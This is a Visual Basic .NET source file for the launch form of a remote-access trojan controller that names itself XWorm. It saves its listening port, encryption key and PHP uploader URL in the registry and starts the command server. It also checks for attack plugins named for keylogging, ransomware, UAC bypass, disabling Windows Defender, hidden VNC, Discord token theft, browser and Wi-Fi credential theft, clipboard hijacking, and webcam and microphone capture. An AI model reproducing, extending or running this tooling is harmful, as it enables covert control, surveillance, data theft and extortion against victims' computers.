Imports System.ComponentModel
Imports System.IO
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Public Class Port
    Public Sub New()
        InitializeComponent()
        Me.Opacity = 0
        FadeIn(Me, 20)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click


        Settings.Port = TextBox1.Text
            Settings.KEY = TextBox2.Text
            Settings.PHP = TextBox5.Text
            Settings.Blocked = New List(Of String)


            Try
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Port", TextBox1.Text)
            Catch ex As Exception
            End Try

            Try
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Key", TextBox2.Text)
            Catch ex As Exception
            End Try

            Try
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"Php", TextBox5.Text)
            Catch ex As Exception
            End Try

            If CheckBox1.Checked = True Then
                Settings.NOTEF = True
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"NoteF", "True")

            Else
                Settings.NOTEF = False
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm",
"NoteF", "False")
            End If

            For Each str2 In Strings.Split("7zip.dll,ACTWindows.dll,AskUAC.dll,Bookmarks.dll,Bot.dll,Chromium.dll,Clipboard.dll,Clipper.dll,Cmstp-Bypass.dll,DeletePoints.dll,DicordTokens.dll,DisableWD.dll,Email.dll,Encoder.dll,FileSeacher.dll,FileZilla.dll,HRDP.dll,HVNC.dll,Info.dll,Keylogger.dll,Memory.dll,PreventSleep.dll,ProduKey.dll,Programs.dll,Ransomware.dll,RunPE.dll,Script.dll,UACBypass.dll,uninstall.dll,Update.dll,VB.dll,Wallpaper.dll,WifiKeys.dll,Worm.dll,BSOD.dll,BlankScreen.dll,NetInstall.dll,Computerdefaults.dll,WDExclusion.dll,Install.dll,TCPGET.dll,WebCam.dll,Microphone.dll,Chat.dll,Pastime.dll,Ngrok-Disk.dll,WSound.dll,InternetExplorer.dll,All-In-One.dll,Maps.dll", ",")
            If (IO.File.Exists("Plugins\" + str2)) = False Then
                MsgBox(("Missing dll >> " & str2), MsgBoxStyle.ApplicationModal, Nothing)
            End If

        Next

            Try
                Messages.F = Form1
                Helper.aes_function()
                Pending.Req_In = New List(Of Incoming_Requests)
                Dim Req_In As New Thread(New ThreadStart(AddressOf Pending.Incoming))
                Req_In.IsBackground = True
                Req_In.Start()

                Pending.Req_Out = New List(Of Outcoming_Requests)
                Dim Req_Out As New Thread(New ThreadStart(AddressOf Pending.OutComing))
                Req_Out.IsBackground = True
                Req_Out.Start()

            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try





        Try


            connect()

            Form1.Timer_Status.Start()

            Me.Hide()

            Form1.Show()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Public Async Sub connect()
        Try
            Await Task.Delay(2000)
            Form1.S = New Server
            Dim listener As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Form1.S.Start))
            listener.Start(Settings.Port)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Private Sub Port_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            Environment.Exit(0)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub



    Private Sub Port_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Dim batPath As String = Path.Combine(Application.StartupPath, "Fixer.bat")
            If Not File.Exists(batPath) Then File.WriteAllText(batPath, My.Resources.Fixer)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        Try
            Dim IntroPath As String = Path.Combine(Application.StartupPath, "Intro.wav")
            If Not File.Exists(IntroPath) Then File.WriteAllBytes(IntroPath, My.Resources.Intro)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        Try

            Dim regKey As RegistryKey
            regKey = My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE", True)
            regKey.CreateSubKey("XWorm")
            regKey.Close()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        TextBox4.Text = HashG.Bot()
        Try
            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "NoteF", Nothing) = "True" Then
                CheckBox1.Checked = True
            Else
                CheckBox1.Checked = False
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try

        Try

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Port", Nothing) = Nothing Then
                TextBox1.Text = "7000"
            Else
                TextBox1.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Port", Nothing)
            End If

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Key", Nothing) = Nothing Then
                TextBox2.Text = "<123456789>"
            Else
                TextBox2.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Key", Nothing)
            End If

            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Php", Nothing) = Nothing Then
                TextBox5.Text = "http://exmple.com/Uploader.php"
            Else
                TextBox5.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\XWorm", "Php", Nothing)
            End If


        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If

    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
        Try
            Dim num As Integer = Conversions.ToInteger(Me.TextBox1.Text)
            If ((Conversions.ToInteger(Me.TextBox1.Text) > &HFFFE) Or (Conversions.ToInteger(Me.TextBox1.Text) < 1)) Then
                Me.Button2.Enabled = False
            Else
                Me.Button2.Enabled = True
            End If
        Catch exception1 As Exception
            Me.Button2.Enabled = False
        End Try
    End Sub

    Private Sub TextBox2_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox2.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles TextBox2.TextChanged
        Try
            If Me.TextBox2.Text.Length > 32 Or ((Me.TextBox2.Text.Length) < 1) Then
                Me.Button2.Enabled = False
            Else
                Me.Button2.Enabled = True
            End If
        Catch ex As Exception
            Me.Button2.Enabled = False
        End Try
    End Sub


    Private Sub CheckBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles CheckBox1.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub


    Private Sub TextBox4_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox4.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub

    Private Sub TextBox3_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub

    Private Sub TextBox5_TextChanged(sender As Object, e As EventArgs) Handles TextBox5.TextChanged

    End Sub

    Private Sub TextBox5_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox5.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True

            If Me.Button2.Enabled = True Then
                Me.Button2.PerformClick()
            End If
        End If
    End Sub
End Class